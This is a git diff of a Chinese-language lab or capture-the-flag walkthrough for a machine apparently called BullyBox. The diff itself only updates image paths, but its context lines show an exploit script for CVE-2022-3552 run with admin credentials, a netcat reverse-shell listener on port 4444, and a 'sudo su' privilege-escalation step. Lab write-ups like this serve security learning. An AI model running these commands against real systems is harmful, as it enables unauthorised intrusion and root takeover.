@@ -101,9 +101,9 @@ python3 cve-2022-3552.py -d http://bullybox.local/ -u 'admin@bullybox.local' -p 
 nc -lvnp 4444
 ```
 
-<figure><img src="../../.gitbook/assets/14 (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/14 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/15 (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/15 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## 权限提升
 
@@ -115,4 +115,4 @@ nc -lvnp 4444
 sudo su
 ```
 
-<figure><img src="../../.gitbook/assets/16 (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/16 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
